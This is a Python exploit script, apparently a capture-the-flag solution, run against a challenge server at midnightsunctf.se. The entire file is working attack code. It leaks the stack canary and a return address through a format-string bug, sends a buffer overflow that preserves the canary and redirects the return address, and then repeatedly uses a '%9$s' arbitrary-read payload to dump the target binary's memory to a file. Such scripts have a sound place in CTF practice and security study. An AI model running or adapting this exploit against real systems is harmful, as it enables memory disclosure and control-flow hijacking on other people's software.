#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

# context.log_level = 'debug'

#==========

mode    = 'SOCKET'
target  = {'host':'pwn2.midnightsunctf.se', 'port':6666}
filename    = 'dump1.bin'

#==========

def dump(conn, addr):
    exploit  = '%9$s!!!!'
    exploit += p64(addr)

    if '\n' in exploit:
        conn.sendlineafter('name? ', 'hoge')
        return ''

    conn.sendlineafter('name? ', exploit)
    conn.recvuntil('Hello ')
    return conn.recvuntil('!!!!', drop=True)

def attack(conn):
    conn.sendlineafter('name? ', '%279$p %283$p ')
    conn.recvuntil('Hello ')
    canary          = int(conn.recvuntil(' ', drop=True), 16)
    addr_ret        = int(conn.recvuntil(' ', drop=True), 16)
    addr_bin_base   = addr_ret - 0x726
    info('canary        = 0x{:08x}'.format(canary))
    info('addr_bin_base = 0x{:08x}'.format(addr_bin_base))

    exploit  = 'a'*0x400
    exploit += p32(canary)
    exploit += 'b'*8
    exploit += p32(0xdeadbeef)
    exploit += p32(addr_ret - 5)
    conn.sendlineafter('today? ', exploit)

    length = len(open(filename, 'rb').read())
    while True:
        try:
            leak = dump(conn, addr_bin_base + length)+'\x00'
            conn.sendlineafter('today? ', exploit)
            open(filename, 'ab').write(leak)
            length += len(leak)
        except:
            break
 
#==========

if __name__=='__main__':
    conn = communicate(mode, **target)
    attack(conn)
   
#==========
